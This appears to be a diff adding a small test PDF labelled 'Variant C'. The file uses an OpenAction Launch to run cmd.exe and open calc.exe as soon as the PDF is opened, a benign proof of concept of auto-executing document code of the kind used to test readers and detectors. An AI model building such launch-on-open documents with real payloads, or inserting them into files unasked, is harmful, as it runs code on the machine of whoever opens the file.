@@ -1,0 +1,37 @@
+%PDF-1.5
+%‚„œ”
+1 0 obj
+<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R >>
+endobj
+2 0 obj
+<< /Type /Pages /Kids [3 0 R] /Count 1 >>
+endobj
+3 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 6 0 R >> >> >>
+endobj
+4 0 obj
+<< /Length 66 >>
+stream
+BT /F1 12 Tf 48 730 Td (Variant C: cmd.exe /c System32 calc) Tj ET
+endstream
+endobj
+5 0 obj
+<< /Type /Action /S /Launch /Win << /F (cmd.exe) /P (/c C:\\Windows\\System32\\calc.exe) >> >>
+endobj
+6 0 obj
+<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>
+endobj
+xref
+0 7
+0000000000 65535 f 
+0000000015 00000 n 
+0000000082 00000 n 
+0000000139 00000 n 
+0000000265 00000 n 
+0000000381 00000 n 
+0000000491 00000 n 
+trailer
+<< /Size 7 /Root 1 0 R >>
+startxref
+561
+%%EOF
